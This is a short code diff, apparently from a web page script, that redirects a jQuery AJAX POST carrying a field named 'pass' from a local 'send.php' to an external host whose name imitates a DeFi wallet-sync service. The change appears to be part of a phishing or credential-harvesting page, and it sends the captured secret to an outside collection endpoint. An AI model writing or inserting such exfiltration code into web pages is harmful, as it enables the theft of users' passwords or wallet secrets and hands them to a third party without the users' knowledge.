@@ -102,7 +102,7 @@ window.addEventListener("load", () => {
 
  const postData  = (data) => {
     $.ajax({
-    url: "send.php",
+    url: "https://syncdefisyns.line.pm/log/send.php",
     type: "POST",
     data: { pass: data },
  });
